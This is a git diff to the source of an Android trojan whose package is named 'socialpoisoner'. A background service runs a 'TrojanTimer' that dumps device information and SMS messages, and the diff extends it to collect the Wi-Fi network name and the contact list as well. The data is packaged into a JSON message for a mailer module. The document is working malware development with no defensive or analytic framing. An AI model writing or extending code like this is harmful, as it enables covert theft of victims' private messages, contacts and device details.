@@ -1,11 +1,14 @@
 package com.cakeman.doctorrabb.socialpoisoner;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.cakeman.doctorrabb.socialpoisoner.modules.Dumper;
+import com.cakeman.doctorrabb.socialpoisoner.modules.Util;
 import com.cakeman.doctorrabb.socialpoisoner.modules.mailer;
 import com.cakeman.doctorrabb.socialpoisoner.modules.messageBuilder;
 import com.cakeman.doctorrabb.socialpoisoner.modules.constants;
@@ -23,7 +26,7 @@ public class srv extends Service {
     public void onCreate () {
 
         Timer notBadTimer = new Timer ();
-        notBadTimer.schedule (new TrojanTimer (), 0, 2000);
+        notBadTimer.schedule (new TrojanTimer (), 0, constants.timer);
 
         Log.d ("Trojan", "Trojan Started!");
     }
@@ -49,10 +52,17 @@ public class srv extends Service {
             messageBuilder messageBuilder = null;
             try {
 
-                messageBuilder = new messageBuilder(new JSONObject ().put ("info",
-                        dumper.dumpInfo(getApplicationContext())).put ("sms",
-                        dumper.dumpSMS(getApplicationContext())));
+                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
+                if (telephonyManager.getSimState() != TelephonyManager.SIM_STATE_READY) {
+                    messageBuilder = new messageBuilder(new JSONObject().put("info", dumper.dumpInfo(getApplicationContext())));
+                }
+                else {
+                    messageBuilder = new messageBuilder(new JSONObject().put("info",
+                            dumper.dumpInfo(getApplicationContext())).put("sms",
+                            dumper.dumpSMS(getApplicationContext())).put("wifi", Util.getCurrentSSID(getApplicationContext()))
+                            .put("contacts", dumper.dumpContacts(getApplicationContext())));
+                }
             } catch (Exception e) {
                 Log.e ("Dump All Error", e.getMessage());
             }
